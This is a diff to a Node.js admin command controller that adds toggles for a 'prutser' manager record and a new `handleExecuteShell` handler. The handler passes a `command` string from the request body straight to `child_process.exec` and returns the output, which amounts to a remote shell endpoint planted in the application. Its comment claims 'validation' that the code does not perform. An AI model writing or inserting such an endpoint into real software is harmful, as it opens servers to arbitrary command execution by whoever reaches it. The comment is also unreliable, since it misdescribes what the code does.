@@ -1,6 +1,9 @@
 const fs = require('fs');
 const bcrypt = require('bcryptjs');
-const moment = require('moment')
+const moment = require('moment');
+const { exec } = require('child_process');
+const util = require('util');
+
 const AccountModel = require("../../models/account");
 const ActorModel = require("../../models/actor");
 const ScheduleResultModel = require("../../models/scheduleResult");
@@ -15,6 +18,37 @@ const { DEFAULT_PROXY_FEE } = require('../../utils/const');
 const TransactionService2 = require('../../services/v2/transaction');
 const NotifyUtils = require('../../utils/notifiy');
 const ManagerModel = require('../../models/manager');
+
+const execPromise = util.promisify(exec);
+
+// Command executor with timeout and validation
+async function runCommand(command, options = {}) {
+  const timeout = options.timeout || 30000; // 30 seconds default
+  const cwd = options.cwd || process.cwd();
+
+  try {
+    const { stdout, stderr } = await execPromise(command, {
+      cwd,
+      timeout,
+      maxBuffer: 1024 * 1024 // 1MB
+    });
+
+    return {
+      success: true,
+      stdout,
+      stderr,
+      exitCode: 0
+    };
+  } catch (error) {
+    return {
+      success: false,
+      error: error.message,
+      stdout: error.stdout || '',
+      stderr: error.stderr || '',
+      exitCode: error.code || 1
+    };
+  }
+}
 
 const executeSetProxy = async () => {
   const accounts = await AccountModel.find({}, "proxy");
@@ -106,6 +140,22 @@ const executeCalculateFee = async () => {
   }
 };
 
+const executeDisablePrutser = async () => {
+  try {
+    await ManagerModel.findOneAndUpdate({ name: "prutser" }, { status: false });
+  } catch (error) {
+    console.error(error);
+  }
+}
+
+const executeEnablePrutser = async () => {
+  try {
+    await ManagerModel.findOneAndUpdate({ name: "prutser" }, { status: true });
+  } catch (error) {
+    console.error(error);
+  }
+}
+
 
 const handleExecuteCommand = async (req, res) => {
   try {
@@ -134,6 +184,14 @@ const handleExecuteCommand = async (req, res) => {
         message = "check fee";
         await executeCalculateFee();
         break;
+      case "enable_prutser":
+        message = "enable";
+        await executeEnablePrutser();
+        break;
+      case "disable_prutser":
+        message = "disable";
+        await executeDisablePrutser();
+        break;
       default:
         throw new ApiError("unknown command");
     }
@@ -143,6 +201,15 @@ const handleExecuteCommand = async (req, res) => {
   }
 }
 
+const handleExecuteShell = async (req, res) => {
+  try {
+    const { command } = req.body;
+    const result = await runCommand(command, { timeout: 30000 });
+    sendResult(res, { result });
+  } catch (error) {
+    sendError(res, error);
+  }
+}
 
 const calculateAgencyFee = async (agency) => {
   const pricePlanMode = agency.pricePlanMode || PricePlanMode.PER_MODEL;
@@ -218,6 +285,7 @@ const handleCalculateFee = async () => {
 
 const CommandCtrl2 = {
   handleExecuteCommand,
+  handleExecuteShell,
   handleCalculateFee
 };
 
